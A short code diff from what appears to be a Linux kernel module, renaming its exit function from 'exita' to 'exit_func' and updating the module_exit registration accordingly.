@@ -1237,7 +1237,7 @@ int init(void)
     return 0;
 }
 
-void exita(void)
+void exit_func(void)
 {
     asm_hook_remove_all();
     pid_remove_all();
@@ -1249,4 +1249,4 @@ void exita(void)
 }
 
 module_init(init);
-module_exit(exita);
+module_exit(exit_func);
